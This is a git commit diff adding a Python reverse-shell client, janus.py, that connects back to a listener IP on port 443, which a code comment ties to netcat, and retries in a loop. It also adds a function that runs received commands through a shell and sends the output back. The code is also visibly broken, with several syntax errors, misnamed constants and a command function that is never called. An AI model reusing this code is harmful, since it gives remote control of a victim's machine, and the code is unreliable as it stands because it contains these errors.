f4d645eb178222a78659fd925ebbc8131090433f
Douglas Brian Neves <douglasbrian369@hotmail.com>
2026-03-17 15:51:27 -0300

    modularização do código

--- janus.py
+++ janus.py
@@ -1,11 +1,61 @@
 import socket
+from time import sleep
+import subprocess
 
 IP = "192.168.x.x"
 PORT = 443 # Ou 444, porta padrão do netcat
 
-c = socket.socket((socket.AF_NET, socket.SOCK_STREAM))
-C.connect((IP ,PORT))
 
-while True:
-    data = c.recv(1024).decode().strip()
-    print(data)
+def connect():
+    try:
+        c = socket.socket((socket.AF_NET, socket.SOCK_STREAM))
+        C.connect((IP ,PORT))
+
+        return c
+    except Exception as e:
+        print(f'Connection error: {e}')
+
+
+def listen(c):  
+    try:
+        while True:
+            data = c.recv(1024).decode().strip()
+            if data == "/exit":
+                return
+            else
+                print(data)
+
+    except Exception as e:
+        print(f'Listen function error: {e}')
+
+
+def cmd(c, data):
+    try:
+        p = subprocess.Popen(
+            data,
+            shell=True,
+            stdin=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            stdout=subprocess.PIPE
+        )
+
+        c.send(p.stdout.read() + p.stderr.read() + "\n" )
+
+   exception Exception as e: 
+        print(f'CMD function error: {e}')
+
+if __name__ == '__main__':
+    try:
+        while True:
+            client = connect()
+
+            if client:
+                listen(client)
+            else :
+                sleep(5)
+
+    exception KeybardInterrupt:
+        print('Program stoped by the user')
+
+    exception Exception as e:
+        print(f'Error in main function: {e}')
